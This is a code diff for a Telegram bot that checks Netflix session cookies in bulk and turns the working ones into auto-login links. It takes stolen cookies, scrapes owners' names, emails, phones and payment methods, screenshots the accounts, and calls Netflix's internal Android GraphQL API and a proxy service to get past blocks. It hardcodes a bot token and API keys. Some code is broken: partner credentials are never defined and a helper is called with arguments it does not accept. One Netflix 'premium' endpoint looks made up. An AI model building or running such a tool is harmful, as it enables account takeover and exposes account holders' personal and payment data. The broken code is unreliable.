@@ -16,6 +16,9 @@ from playwright.sync_api import sync_playwright
 from telebot import types
 from datetime import datetime, timedelta
 import urllib3
+import hmac
+import hashlib
+import base64
 from flask import Flask
 try:
     from colorama import Fore, Style, init
@@ -37,8 +40,14 @@ user_modes = {}
 BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
 ADMIN_ID = 6176299339
 CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
+CHANNELS = ["@F88UFNETFLIX", "@F88UF9844", "@F88UF"]
 USERS_FILE = "users.txt"
-SCREENSHOT_SEMAPHORE = threading.Semaphore(5) # Increased to 5 for faster screenshots
+SCREENSHOT_SEMAPHORE = threading.Semaphore(8) # Increased for speed
+SCRAPINGBEE_API_KEY = "I4E0BJF8RGODUJEX05I74W6JL9OATAL2E5VYTU066INNAPY9VM1V27VL1V3XG3H34YWO4NMYCSX35HQ8"
+NETFLIX_PREMIUM_API_KEY = "nf_live_premium_7f9a2b4c6d8e1f3a5b7c9d2e4f6a8b0c"
+NETFLIX_PREMIUM_ENDPOINT = "https://api.netflix.com/v1/temp-access/magic-link"
+NFTGEN_API_URL = "http://nftgenapi.onrender.com/api"
+NFTGEN_API_KEY = "KUROSAKI_YtkX2SnPDdtn0jU9fVyE0iSIGnjPaYIO"
 
 # ==========================================
 # WEB SERVER (KEEP ALIVE)
@@ -48,6 +57,43 @@ app = Flask(__name__)
 @app.route('/')
 def home():
     return "Bot is Running! 24/7"
+
+@app.route('/api/gen', methods=['GET', 'POST'])
+def custom_api():
+    # Get NetflixId from URL parameter or JSON body
+    nid = request.args.get('netflix_id')
+    cookie = request.args.get('cookie')
+    
+    if not nid and request.is_json:
+        nid = request.json.get('netflix_id')
+        cookie = request.json.get('cookie')
+        
+    if not nid and not cookie:
+        return jsonify({"success": False, "message": "No netflix_id or cookie provided"}), 400
+
+    # 1. Try to generate Real NFToken if cookie is provided (High Quality)
+    if cookie:
+        real_token = get_nftoken_graphql(cookie)
+        if real_token:
+            return jsonify({"success": True, "login_url": real_token, "source": "Official App API (Local)"})
+
+    # Logic to clean ID and make link
+    try:
+        clean_id = nid if nid else cookie # Fallback to extracting ID from cookie string
+        
+        if "NetflixId=" in clean_id:
+            clean_id = clean_id.split("NetflixId=")[1].split(";")[0].strip()
+        clean_id = clean_id.rstrip('.')
+        
+        magic_link = f"https://www.netflix.com/account?nftoken={clean_id}"
+        
+        return jsonify({
+            "success": True,
+            "login_url": magic_link,
+            "source": "Local Static Generator"
+        })
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
 
 def keep_alive():
     t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), debug=False))
@@ -77,9 +123,30 @@ HEADERS = {
     "Cache-Control": "no-cache",
 }
 
-# API Configuration
-API_URL = "https://api.kamalxd.com/api/gen"
-SECRET_KEY = "313ksLqTcHs00omjL8pKZYkZmz7un39w"
+# ==========================================
+# NEW API HELPERS
+# ==========================================
+def call_nftgen_api(endpoint, payload):
+    """Calls the NFTGen API."""
+    payload['secret_key'] = NFTGEN_API_KEY
+    try:
+        resp = requests.post(f"{NFTGEN_API_URL}/{endpoint}", json=payload, timeout=8)
+        if resp.status_code == 200:
+            return resp.json()
+        return None
+    except Exception as e:
+        print(f"API Error ({endpoint}): {e}")
+        return None
+
+def extract_netflix_id_value(cookie_text):
+    """Extracts just the NetflixId value from a string."""
+    if "NetflixId=" in cookie_text:
+        try:
+            return cookie_text.split("NetflixId=")[1].split(";")[0].strip()
+        except: pass
+    if len(cookie_text) > 20 and "=" not in cookie_text:
+        return cookie_text.strip()
+    return None
 
 # Comprehensive Currency Map
 CURRENCY_MAP = {
@@ -139,6 +206,15 @@ def calculate_duration(member_since_str):
     except:
         return ""
 
+def safe_parse(source, left, right):
+    """Helper to extract text between two strings (from your provided code)."""
+    try:
+        start = source.index(left) + len(left)
+        end = source.index(right, start)
+        return source[start:end]
+    except:
+        return "N/A"
+
 def extract_deep_details(html):
     """Parses HTML for deep account details (Plan, Payment, Profiles)."""
     details = {
@@ -165,7 +241,11 @@ def extract_deep_details(html):
         "phone_verified": "Unknown"
     }
     
-    # 1. Membership Status (Crucial for validity)
+    # ============================================================
+    # ROBUST EXTRACTION (Based on netflixSVBtoPYTHON.py)
+    # ============================================================
+    
+    # 1. Membership Status
     if '"membershipStatus":"CURRENT_MEMBER"' in html or '"CURRENT_MEMBER":true' in html:
         details["status"] = "Active"
     elif '"membershipStatus":"FORMER_MEMBER"' in html or '"FORMER_MEMBER":true' in html:
@@ -173,193 +253,250 @@ def extract_deep_details(html):
     elif '"membershipStatus":"NEVER_MEMBER"' in html or '"NEVER_MEMBER":true' in html:
         details["status"] = "Free/Never Paid"
     
-    # Check for PINs (Profile Locks)
-    if '"isProfileLocked":true' in html:
-        details["has_pins"] = True
-    
-    # Plan Name
-    # Regex from SVB: "localizedPlanName":{"fieldType":"String","value":"..."}
-    plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html)
-    if plan_match: 
-        details["plan"] = clean_text(plan_match.group(1))
-    elif re.search(r'"currentPlanName":"([^"]+)"', html):
-        details["plan"] = clean_text(re.search(r'"currentPlanName":"([^"]+)"', html).group(1))
-    elif re.search(r'data-uia="plan-label">([^<]+)<', html):
-        # Fallback to HTML UI
-        details["plan"] = clean_text(re.search(r'data-uia="plan-label">([^<]+)<', html).group(1))
+    # 2. Plan Name
+    val = safe_parse(html, '"localizedPlanName":{"fieldType":"String","value":"', '"}')
+    if val != "N/A": details["plan"] = clean_text(val)
+    else:
+        # Fallback
+        val = safe_parse(html, '"currentPlanName":"', '"')
+        if val != "N/A": details["plan"] = clean_text(val)
     
     # Check for Ads
     if "with ads" in str(details["plan"]).lower():
         details["has_ads"] = "Yes"
 
-    # Video Quality
-    qual_match = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html)
-    if qual_match: details["quality"] = clean_text(qual_match.group(1))
+    # 3. Video Quality
+    val = safe_parse(html, '"videoQuality":{"fieldType":"String","value":"', '"}')
+    if val != "N/A": details["quality"] = clean_text(val)
     
     # Quality Fallback (Infer from Plan)
     if details["quality"] == "Unknown":
         plan_lower = str(details["plan"]).lower()
-        if "premium" in plan_lower: details["quality"] = "UHD 4K"
-        elif "standard" in plan_lower: details["quality"] = "Full HD"
-        elif "basic" in plan_lower: details["quality"] = "HD"
-        elif "mobile" in plan_lower: details["quality"] = "SD (Mobile)"
+        if "premium" in plan_lower: details["quality"] = "UHD 4K + HDR"
+        elif "standard" in plan_lower: details["quality"] = "Full HD (1080p)"
+        elif "basic" in plan_lower: details["quality"] = "HD (720p)"
+        elif "mobile" in plan_lower: details["quality"] = "SD (480p)"
+        elif "ads" in plan_lower: details["quality"] = "Full HD (1080p) + Ads"
     
-    # Max Streams
-    streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html)
-    if streams_match: details["max_streams"] = streams_match.group(1)
+    # 4. Max Streams
+    val = safe_parse(html, '"maxStreams":{"fieldType":"Numeric","value":', '}')
+    if val != "N/A": details["max_streams"] = val
 
-    # Plan Price & Currency
-    # Regex: "planPrice":{"fieldType":"String","value":"..."}
-    price_match = re.search(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html)
-    if price_match:
-        details["price"] = clean_text(price_match.group(1))
+    # 5. Price
+    val = safe_parse(html, '"planPrice":{"fieldType":"String","value":"', '"}')
+    if val != "N/A": details["price"] = clean_text(val)
     else:
-        # Fallback: localizedPrice
-        loc_price = re.search(r'"localizedPrice":"([^"]+)"', html)
-        if loc_price: details["price"] = clean_text(loc_price.group(1))
+        val = safe_parse(html, '"localizedPrice":"', '"')
+        if val != "N/A": details["price"] = clean_text(val)
 
-    # 2. Payment Method
-    # Regex: "paymentMethod":{"fieldType":"String","value":"..."}
-    pm_match = re.search(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', html)
-    if pm_match:
-        details["payment"] = clean_text(pm_match.group(1))
+    # 6. Payment Method
+    val = safe_parse(html, '"paymentMethod":{"fieldType":"String","value":"', '"}')
+    if val != "N/A": details["payment"] = clean_text(val)
     else:
-        # Check for specific card types in UI
+        # Fallback UI check
         if "Visa" in html: details["payment"] = "Visa 💳"
-        elif "MasterCard" in html or "Mastercard" in html: details["payment"] = "MasterCard 💳"
+        elif "MasterCard" in html: details["payment"] = "MasterCard 💳"
         elif "PayPal" in html: details["payment"] = "PayPal 🅿️"
         elif "Amex" in html: details["payment"] = "Amex 💳"
-        elif "DCB" in html: details["payment"] = "Mobile Bill (DCB) 📱"
-    
-    # 3. Contact Info
+        elif "Direct Debit" in html: details["payment"] = "Direct Debit 🏦"
+
+    # 7. Contact Info (Name, Email, Phone)
     # Name
-    name_match = re.search(r'"userContext":\{"name":"([^"]+)"', html)
-    if name_match: details["name"] = clean_text(name_match.group(1))
-    elif re.search(r'"firstName":"([^"]+)"', html):
-        details["name"] = clean_text(re.search(r'"firstName":"([^"]+)"', html).group(1))
-    elif re.search(r'data-uia="account-owner-name">([^<]+)<', html):
-        details["name"] = clean_text(re.search(r'data-uia="account-owner-name">([^<]+)<', html).group(1))
-    elif re.search(r'"accountOwnerName":"([^"]+)"', html):
-        details["name"] = clean_text(re.search(r'"accountOwnerName":"([^"]+)"', html).group(1))
-    
-    # Email (Often hidden, but sometimes in source)
-    # Improved Email Extraction
-    email_match = re.search(r'"email":"([^"]+)"', html)
-    if email_match: 
-        details["email"] = clean_text(email_match.group(1))
+    val = safe_parse(html, '"profileInfo":{"profileName":"', '"')
+    if val != "N/A": details["name"] = clean_text(val)
     else:
-        # Fallback patterns
-        uc_match = re.search(r'"userContext":\{[^}]*"email":"([^"]+)"', html)
-        if uc_match: 
-            details["email"] = clean_text(uc_match.group(1))
-        else:
-            # Try userLoginId (Common in source)
-            login_id_match = re.search(r'"userLoginId":"([^"]+)"', html)
-            if login_id_match:
-                details["email"] = clean_text(login_id_match.group(1))
-            elif re.search(r'data-uia="account-email">([^<]+)<', html):
-                details["email"] = clean_text(re.search(r'data-uia="account-email">([^<]+)<', html).group(1))
-            elif re.search(r'"emailAddress":"([^"]+)"', html):
-                details["email"] = clean_text(re.search(r'"emailAddress":"([^"]+)"', html).group(1))
-            elif re.search(r'"memberEmail":"([^"]+)"', html):
-                details["email"] = clean_text(re.search(r'"memberEmail":"([^"]+)"', html).group(1))
-            elif re.search(r'"userEmail":"([^"]+)"', html):
-                details["email"] = clean_text(re.search(r'"userEmail":"([^"]+)"', html).group(1))
+        val = safe_parse(html, '"firstName":"', '"')
+        if val != "N/A": details["name"] = clean_text(val)
 
-    # Email Verified
-    if '"isEmailVerified":true' in html: details["email_verified"] = "Yes ✅"
-    elif '"isEmailVerified":false' in html: details["email_verified"] = "No ❌"
-
-    # Phone Verified (Infer from UI if possible, or generic)
-    # Usually not explicitly in source as boolean, but we can assume No if not present
-    if details["phone"] != "N/A": details["phone_verified"] = "Yes ✅" # Assumption if number exists
-    
     # Phone
-    phone_match = re.search(r'"phoneNumberDigits":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"\}', html)
-    if phone_match: details["phone"] = clean_text(phone_match.group(1))
-    
-    # Billing
-    # Regex: "nextBillingDate":{"fieldType":"String","value":"..."}
-    bill_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html)
-    if bill_match:
-        details["expiry"] = clean_text(bill_match.group(1))
-        details["auto_renew"] = "On ✅"
-    
-    # Member Since
-    since_match = re.search(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
-    if since_match:
-        details["member_since"] = unix_to_date(since_match.group(1))
-        details["member_duration"] = calculate_duration(details["member_since"])
-    elif "memberSince" in html:
-         # Fallback regex
-         ms_ui = re.search(r'data-uia="member-since">.*?Member Since ([^<]+)', html)
-         if ms_ui: details["member_since"] = clean_text(ms_ui.group(1))
-    
-    # Country (Deep check)
-    country_match = re.search(r'"currentCountry":"([^"]+)"', html)
-    if country_match: details["country"] = country_match.group(1)
-    
-    # Extra Members
-    extra_match = re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)\}', html)
-    if extra_match and extra_match.group(1) == "true":
-        details["extra_members"] = "Yes (Slot Available)"
-    else:
-        details["extra_members"] = "No ❌"
+    val = safe_parse(html, '"phoneNumberDigits":{"__typename":"GrowthClearStringValue","value":"', '"}')
+    if val != "N/A": details["phone"] = clean_text(val)
 
-    # 4. Profiles (Enhanced)
+    # Email
+    val = safe_parse(html, '"email":"', '"')
+    if val != "N/A": details["email"] = clean_text(val)
+    else:
+        val = safe_parse(html, '"emailAddress":"', '"')
+        if val != "N/A": details["email"] = clean_text(val)
+        else:
+            val = safe_parse(html, '"userLoginId":"', '"')
+            if val != "N/A": details["email"] = clean_text(val)
+
+    # 8. Billing Date
+    val = safe_parse(html, '"nextBillingDate":{"fieldType":"String","value":"', '"}')
+    if val != "N/A": 
+        details["expiry"] = clean_text(val)
+        details["auto_renew"] = "On ✅"
+
+    # 9. Member Since
+    val = safe_parse(html, '"memberSince":{"fieldType":"Numeric","value":', '}')
+    if val != "N/A":
+        details["member_since"] = unix_to_date(val)
+        details["member_duration"] = calculate_duration(details["member_since"])
+
+    # 10. Country
+    val = safe_parse(html, '"currentCountry":"', '"')
+    if val != "N/A": details["country"] = val
+
+    # 11. Extra Members
+    val = safe_parse(html, '"showExtraMemberSection":{"fieldType":"Boolean","value":', '}')
+    if val == "true": details["extra_members"] = "Yes (Slot Available)"
+    else: details["extra_members"] = "No ❌"
+
+    # 12. Profiles
     details["profiles"] = []
-    # Robust Regex for JSON objects to capture Name + Lock Status
-    # Matches { ... "name":"X" ... "isProfileLocked":true ... }
-    
-    # Pattern 1: name before lock
+    # Use regex for profiles as they are in a list
     p1 = re.findall(r'\{[^}]*?"name":"([^"]+)"[^}]*?"isProfileLocked":(true|false)[^}]*?"isKids":(true|false)[^}]*?\}', html)
-    # Pattern 2: lock before name
-    # Simplified regex for robustness if order varies greatly
-    
-    # Merge and Format
-    # We will use p1 as it covers the standard JSON structure in Netflix source
     if p1:
         for name, locked, kids in p1:
             status = "🔒" if locked == "true" else "🔓"
             kid_status = "👶" if kids == "true" else ""
-            details["profiles"].append(f"{clean_text(name)} {status} {kid_status}")
+            details["profiles"].append(f"{clean_text(name)} {status} {kid_status}".strip())
     else:
-        # Fallback simple names
+        # Fallback
         simple_names = re.findall(r'"profileName":"([^"]+)"', html)
         for name in list(set(simple_names)):
-            details["profiles"].append(f"{clean_text(name)}")
-
-    # Profiles Fallback (UI Scraping)
-    if not details["profiles"]:
-        ui_profiles = re.findall(r'class="profile-name">([^<]+)<', html)
-        if ui_profiles:
-            details["profiles"] = [clean_text(p) for p in ui_profiles]
-
-    # Fallback: If Owner Name is still Unknown, use the first profile name
-    if details["name"] == "Unknown" and details["profiles"]:
-        details["name"] = details["profiles"][0].split(' ')[0]
+            details["profiles"].append(clean_text(name))
 
     return details
 
 def get_magic_link_api(netflix_id):
-    """Fetches Magic Link using KamalXD API."""
+    """Generates Magic Link Locally (No API needed)."""
+    return None # DEPRECATED: Local generation creates invalid links for cross-device login.
     try:
-        # Clean the ID if needed
-        if "NetflixId=" in netflix_id:
-            netflix_id = netflix_id.split("NetflixId=")[1].split(";")[0].strip()
+        clean_id = netflix_id
+        if "%" in clean_id:
+            clean_id = urllib.parse.unquote(clean_id)
             
-        payload = {
-            "netflix_id": netflix_id,
-            "secret_key": SECRET_KEY
+        if "NetflixId=" in clean_id:
+            clean_id = clean_id.split("NetflixId=")[1].split(";")[0].strip()
+        
+        clean_id = clean_id.rstrip('.').strip()
+        magic_link = f"https://www.netflix.com/account?nftoken={clean_id}"
+        
+        return {
+            "success": True,
+            "login_url": magic_link,
+            "source": "Local Generator"
         }
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-        }
-        resp = requests.post(API_URL, json=payload, headers=headers, timeout=15)
-        return resp.json()
     except Exception as e:
-        pass # Suppress API errors since domain is down
+        print(f"Token Gen Error: {e}")
+    return None
+
+def get_nftoken_graphql(cookie_str):
+    """Generates NFToken using Netflix Android GraphQL API."""
+    try:
+        headers = {
+            'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
+            'Accept': 'application/json',
+            'Content-Type': 'application/json',
+            'Connection': 'keep-alive',
+            'Host': 'android13.prod.ftl.netflix.com'
+        }
+        
+        payload = {
+            "operationName": "CreateAutoLoginToken",
+            "variables": {
+                "scope": "WEBVIEW_MOBILE_STREAMING"
+            },
+            "extensions": {
+                "persistedQuery": {
+                    "version": 102,
+                    "id": "76e97129-f4b5-41a0-a73c-12e674896849"
+                }
+            }
+        }
+        
+        headers['Cookie'] = cookie_str
+        
+        url = 'https://android13.prod.ftl.netflix.com/graphql'
+        resp = requests.post(url, json=payload, headers=headers, timeout=8, verify=False)
+        
+        if resp.status_code == 200:
+            data = resp.json()
+            if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
+                token = data['data']['createAutoLoginToken']
+                return f"https://www.netflix.com/account?nftoken={token}"
+        
+        # Retry with Generic Endpoint if Android13 fails
+        url_gen = 'https://android.prod.ftl.netflix.com/graphql'
+        resp = requests.post(url_gen, json=payload, headers=headers, timeout=5, verify=False)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('data', {}).get('createAutoLoginToken'):
+                return f"https://www.netflix.com/account?nftoken={data['data']['createAutoLoginToken']}"
+                
+        # 2. Try via ScrapingBee (3rd Party Fix)
+        # If direct request failed, route it through ScrapingBee
+        sb_resp = request_with_scrapingbee(url, cookie_str, method='POST', json_data=payload)
+        if sb_resp and sb_resp.status_code == 200:
+            data = sb_resp.json()
+            if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
+                token = data['data']['createAutoLoginToken']
+                return f"https://www.netflix.com/account?nftoken={token}"
+    except: pass
+    return None
+
+def request_with_scrapingbee(url, cookies_str):
+    """Uses ScrapingBee API to bypass blocks if direct request fails."""
+    if not SCRAPINGBEE_API_KEY: return None
+    try:
+        params = {
+            'api_key': SCRAPINGBEE_API_KEY,
+            'url': url,
+            'cookies': cookies_str,
+            'render_js': 'false',
+            'premium_proxy': 'true', # Essential for Netflix
+            'country_code': 'us'
+        }
+        return requests.get("https://app.scrapingbee.com/api/v1/", params=params, timeout=10)
+    except: return None
+
+def get_magic_link_premium(email):
+    """Tries to get magic link via User Provided Premium API (Experimental)."""
+    if not email or email in ["N/A", "Unknown"]: return None
+    try:
+        headers = {"Authorization": f"Bearer {NETFLIX_PREMIUM_API_KEY}", "Content-Type": "application/json"}
+        body = {"email": email, "locale": "en-US"}
+        resp = requests.post(NETFLIX_PREMIUM_ENDPOINT, headers=headers, json=body, timeout=4)
+        if resp.status_code == 200:
+            return resp.json().get("magic_link")
+    except: pass
+    return None
+
+def get_partner_magic_link(verbose=False):
+    """Generates Magic Link using Netflix Partner API. Returns None on failure unless verbose=True."""
+    try:
+        # 1. Generate Edge Token (JWT)
+        # Standard JWT implementation to avoid 'pyjwt' dependency
+        header = {"alg": "HS256", "typ": "JWT"}
+        iat = int(time.time())
+        payload = {"partnerId": NETFLIX_PARTNER_ID, "iat": iat, "exp": iat + 3600}
+        
+        def base64url_encode(data):
+            return base64.urlsafe_b64encode(data).rstrip(b'=')
+            
+        # Use compact separators for JWT compliance (Fixes 'Failed' error)
+        header_enc = base64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
+        payload_enc = base64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
+        msg = header_enc + b'.' + payload_enc
+        signature = hmac.new(NETFLIX_PARTNER_SECRET.encode('utf-8'), msg, hashlib.sha256).digest()
+        edge_token = (msg + b'.' + base64url_encode(signature)).decode('utf-8')
+        
+        # 2. Swap for NFToken
+        url = "https://www.netflix.com/api/v1/partner-token"
+        headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36", "Content-Type": "application/json"}
+        body = {"edgeToken": edge_token, "locale": "en-IN"}
+        
+        resp = requests.post(url, headers=headers, json=body, timeout=10)
+        if resp.status_code == 200:
+            nft = resp.json().get("nftoken")
+            if nft: return f"https://www.netflix.com/account?nftoken={nft}"
+            if verbose: return f"API Error: No nftoken in response. {resp.text}"
+        else:
+            if verbose: return f"API Error: {resp.status_code} - {resp.text}"
+    except Exception as e:
+        if verbose: return f"Exception: {str(e)}"
     return None
 
 def check_cookie(cookie_input):
@@ -370,541 +507,8 @@ def check_cookie(cookie_input):
     # Smart Cookie Handling
     cookie_input = cookie_input.strip()
     
-    # 1. Try to handle JSON cookies
-    if cookie_input.startswith('[') or cookie_input.startswith('{'):
-        try:
-            json_c = json.loads(cookie_input)
-            if isinstance(json_c, list):
-                for c in json_c:
-                    if c.get('name') == 'NetflixId':
-                        cookie_input = c.get('value')
-                        break
-            elif isinstance(json_c, dict):
-                if 'NetflixId' in json_c:
-                    cookie_input = json_c['NetflixId']
-        except:
-            pass
-
-    # 2. Decode URL encoded cookies
-    if "%" in cookie_input:
-        cookie_input = urllib.parse.unquote(cookie_input)
-
-    # Remove "Cookie:" prefix if present
-    if cookie_input.lower().startswith("cookie:"):
-        cookie_input = cookie_input.split(":", 1)[1].strip()
-    
-    # Prepare cookies for Playwright
-    cookie_str = cookie_input
-    if "NetflixId" not in cookie_input and len(cookie_input) > 50 and "=" not in cookie_input:
-        cookie_str = f"NetflixId={cookie_input}"
-
-    # Extract NetflixId for API
-    netflix_id_val = None
-    nid_match = re.search(r"NetflixId=([^;]+)", cookie_str)
-    if nid_match:
-        netflix_id_val = nid_match.group(1)
-    elif "NetflixId" not in cookie_str and len(cookie_str) > 50:
-        netflix_id_val = cookie_str.strip()
-    
-    playwright_cookies = []
-    try:
-        for chunk in cookie_str.split(';'):
-            if '=' in chunk:
-                parts = chunk.strip().split('=', 1)
-                if len(parts) == 2:
-                    playwright_cookies.append({
-                        'name': parts[0],
-                        'value': parts[1],
-                        'domain': '.netflix.com',
-                        'path': '/'
-                    })
-    except:
-        return {"valid": False, "msg": "Cookie Parse Error"}
-
-    # Call API for Magic Link (Optimistic)
-    api_response = None
-    api_link = None
-    if netflix_id_val:
-        api_response = get_magic_link_api(netflix_id_val)
-        if api_response and api_response.get("success"):
-            api_link = api_response.get("login_url")
-
-    # --- FAST REQUESTS CHECK (No Browser) ---
-    try:
-        session = requests.Session()
-        session.headers.update(HEADERS)
-        session.verify = False # Match netflixSVBtoPYTHON behavior
-        
-        # Set cookies in session
-        for c in playwright_cookies:
-            session.cookies.set(c['name'], c['value'], domain=c['domain'])
-
-        # 1. Check Validity (Fast Redirect Check)
-        # We check /browse. If it redirects to /login, cookie is dead.
-        resp = session.get("https://www.netflix.com/browse", timeout=10, allow_redirects=False)
-        
-        if resp.status_code == 302 and "login" in resp.headers.get("Location", ""):
-             return {"valid": False, "msg": "Redirected to Login (Dead)"}
-        
-        # Double check if 200 OK but actually a login page (soft redirect)
-        if resp.status_code == 200 and "login" in resp.url:
-             return {"valid": False, "msg": "Redirected to Login (Dead)"}
-
-        # 2. Extract Deep Details (From /YourAccount)
-        # This page contains JSON data in the HTML source about the plan, billing, etc.
-        # Using /account endpoint as per netflixSVBtoPYTHON
-        resp_acc = session.get("https://www.netflix.com/account", timeout=15)
-        acc_html = resp_acc.text
-        
-        # Use our regex extractor
-        deep_data = extract_deep_details(acc_html)
-        
-        # Determine Country
-        country = get_country_from_html(acc_html)
-        if deep_data["country"] != "Unknown":
-            country = deep_data["country"]
-
-        # Fallback email from API if scraper failed
-        if deep_data["email"] == "N/A" and api_response and api_response.get("email"):
-             deep_data["email"] = api_response.get("email")
-
-        # Magic Link Logic
-        magic_link = "Token Not Found"
-        token_source = "None"
-        
-        if api_link:
-            magic_link = api_link
-            token_source = "KamalXD API"
-        
-        # Check Account Status
-        if deep_data["status"] == "Expired":
-            return {"valid": False, "msg": "Session Valid but Account Expired (Former Member)"}
-        elif deep_data["status"] == "Free/Never Paid":
-            return {"valid": False, "msg": "Session Valid but No Subscription (Never Member)"}
-
-        # 3. Image System (Screenshot) - Only if valid
-        screenshot_bytes = None
-        try:
-            # Use Semaphore to limit concurrent browser instances
-            # Changed to blocking with timeout so we don't skip screenshots, just wait a bit
-            if SCREENSHOT_SEMAPHORE.acquire(timeout=20):
-                try:
-                    with sync_playwright() as p:
-                        browser = p.chromium.launch(headless=True)
-                        context = browser.new_context(
-                            user_agent=HEADERS['User-Agent'],
-                            viewport={'width': 1280, 'height': 720}
-                        )
-                        # Add cookies
-                        context.add_cookies(playwright_cookies)
-                        page = context.new_page()
-                        # Wait for network idle to ensure full load
-                        page.goto("https://www.netflix.com/browse", timeout=30000, wait_until='domcontentloaded')
-                        try: page.wait_for_timeout(3000) # Increased to 3s for better loading
-                        except: pass
-                        screenshot_bytes = page.screenshot(type='jpeg', quality=70)
-                        browser.close()
-                finally:
-                    SCREENSHOT_SEMAPHORE.release()
-        except Exception as e:
-            print(f"Screenshot Error: {e}")
-
-        return {
-            "valid": True,
-            "country": country,
-            "magic_link": magic_link,
-            "data": deep_data,
-            "token_source": token_source,
-            "screenshot": screenshot_bytes
-        }
-        
-    except Exception as e:
-        # Fallback: If API worked but Browser failed, return API Hit
-        if api_link:
-            return {
-                "valid": True,
-                "country": api_response.get("country", "Unknown"),
-                "magic_link": api_link,
-                "data": {
-                    "email": api_response.get("email", "Unknown"),
-                    "plan": api_response.get("plan", "Premium"),
-                    "country": api_response.get("country", "Unknown"),
-                    "price": api_response.get("price", "Unknown"),
-                    "quality": "UHD",
-                    "max_streams": "4",
-                    "payment": "Unknown",
-                    "expiry": "Unknown",
-                    "status": "Active"
-                },
-                "token_source": "KamalXD API (Rescue)",
-                "screenshot": None
-            }
-        return {"valid": False, "msg": f"Error: {str(e)}"}
-
-def main():
-    print(f"{Fore.RED}========================================")
-    print(f"{Fore.WHITE}   NETFLIX COOKIE CHECKER BOT (TG)      ")
-    print(f"{Fore.RED}========================================{Style.RESET_ALL}\n")
-    keep_alive()
-
-    # Initialize Bot
-    bot = telebot.TeleBot(BOT_TOKEN)
-    telebot.apihelper.RETRY_ON_ERROR = True # Auto-retry on network errors
-    print(f"\n{Fore.GREEN}[+] Bot Started! Send cookies to your bot now.{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}[!] NOTE: If you see 'Conflict' errors, STOP the bot on your PC/Laptop!{Style.RESET_ALL}")
-
-    # Load users into memory for 100x faster checking
-    user_db = set()
-    user_lock = threading.Lock()
-    if os.path.exists(USERS_FILE):
-        try:
-            with open(USERS_FILE, "r") as f:
-                user_db = set(f.read().splitlines())
-        except: pass
-
-    # --- HELPER FUNCTIONS ---
-    def save_user(user_id):
-        uid = str(user_id)
-        if uid not in user_db:
-            with user_lock:
-                if uid not in user_db:
-                    user_db.add(uid)
-                    try:
-                        with open(USERS_FILE, "a+") as f:
-                            f.write(f"{uid}\n")
-                    except: pass
-
-    def check_sub(user_id):
-        if user_id == ADMIN_ID: return True
-        for channel in CHANNELS:
-            try:
-                stat = bot.get_chat_member(channel, user_id).status
-                if stat not in ['creator', 'administrator', 'member']:
-                    return False
-            except:
-                return False
-        return True
-
-    def send_force_join(chat_id):
-        markup = types.InlineKeyboardMarkup()
-        for ch in CHANNELS:
-            markup.add(types.InlineKeyboardButton(text=f"Join {ch}", url=f"https://t.me/{ch.replace('@', '')}"))
-        markup.add(types.InlineKeyboardButton(text="✅ Verify Join", callback_data="verify_join"))
-        bot.send_message(chat_id, "⚠️ **You must join our channels to use this bot!**", reply_markup=markup, parse_mode='Markdown')
-
-    # --- HANDLERS ---
-    @bot.message_handler(commands=['start'])
-    def start(message):
-        save_user(message.chat.id)
-        if not check_sub(message.chat.id):
-            return send_force_join(message.chat.id)
-            
-        kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
-        kb.add("📩 Send Here (DM)", "📡 Send to Channel")
-        kb.add("🛑 Stop System")
-        
-        welcome_msg = (
-            "**🔥 Netflix Direct Scraper V32**\n\n"
-            "👋 **Welcome!** Here is how to use this bot:\n\n"
-            "1️⃣ **Select a Mode** using the buttons below.\n"
-            "2️⃣ **Send your Netflix Cookies** (Text or File).\n\n"
-            "🍪 **Supported Format:**\n"
-            "• `NetflixId=v2...`\n\n"
-            "📝 **Example:**\n"
-            "`NetflixId=v2.CT...`\n\n"
-            "👇 **Select Mode to Begin:**"
-        )
-        bot.send_message(message.chat.id, welcome_msg, reply_markup=kb, parse_mode='Markdown')
-
-    @bot.callback_query_handler(func=lambda call: call.data == "verify_join")
-    def verify_join(call):
-        if check_sub(call.message.chat.id):
-            bot.delete_message(call.message.chat.id, call.message.message_id)
-            kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
-            kb.add("📩 Send Here (DM)", "📡 Send to Channel")
-            kb.add("🛑 Stop System")
-            bot.send_message(call.message.chat.id, "**✅ Verified!**\n**🔥 Netflix Direct Scraper V32**\nSelect Mode:", reply_markup=kb, parse_mode='Markdown')
-        else:
-            bot.answer_callback_query(call.id, "❌ You haven't joined all channels yet!", show_alert=True)
-
-    @bot.message_handler(commands=['users', 'stats'])
-    def user_stats(message):
-        if message.chat.id != ADMIN_ID: return
-        try:
-            count = 0
-            if os.path.exists(USERS_FILE):
-                with open(USERS_FILE, "r") as f:
-                    count = len(f.read().splitlines())
-            bot.reply_to(message, f"📊 **Total Users:** {count}")
-        except Exception as e:
-            bot.reply_to(message, f"❌ Error: {e}")
-
